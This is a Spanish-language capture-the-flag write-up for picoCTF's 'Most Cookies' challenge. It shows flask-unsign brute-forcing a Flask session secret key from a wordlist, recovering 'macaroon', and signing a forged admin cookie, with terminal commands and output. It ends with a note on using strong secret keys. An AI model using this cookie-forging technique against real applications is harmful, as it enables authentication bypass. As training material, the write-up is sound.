## RETO
Most Cookies
## DESCRIPCION
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

Additional details will be available after launching your challenge instance.

Alright, enough of using my own encryption. Flask session cookies should be plenty secure! http://wily-courier.picoctf.net:57176/
## SOLUCION
#### 1. Entender la vulnerabilidad

Flask guarda la información de la sesión en el navegador del usuario en un formato que parece aleatorio, pero que en realidad es solo Base64. Sin embargo, tiene una **firma criptográfica** al final.

- Si intentas cambiar "user" por "admin" en la cookie sin conocer la llave, el servidor rechazará la cookie porque la firma ya no coincidirá.
#### 2. Fuerza Bruta a la Llave Secreta

Necesitas una herramienta para probar rápidamente todas las posibles llaves de la lista hasta encontrar la que valide la cookie actual. Una de las más famosas es `flask-unsign`.

──(kali㉿kali)-[~]
└─$ python3 -m venv mi_entorno
                                                                                 
┌──(kali㉿kali)-[~]
└─$ source mi_entorno/bin/activate
                                                                                 
┌──(mi_entorno)─(kali㉿kali)-[~]
└─$ pip install flask-unsign

┌──(mi_entorno)─(kali㉿kali)-[~]
└─$ cd ~/Documents   

┌──(mi_entorno)─(kali㉿kali)-[~/Documents]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aa5uAA.-nQneHQT07QIDgI9MZoWFVMfRVQ" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'macaroon'
                                                                                 
┌──(mi_entorno)─(kali㉿kali)-[~/Documents]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'macaroon'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aa5tsw.YQBWz7MpcsFYlFz3nknjdbJnMn0

![[Pasted image 20260309005748.png]]
## NOTAS ADICIONALES
**Seguridad Real:** En aplicaciones reales, la `SECRET_KEY` debe ser una cadena larga, aleatoria y compleja. Usar palabras comunes como "chocolate" hace que el sistema sea vulnerable a ataques de diccionario.

## REFERENCIAS
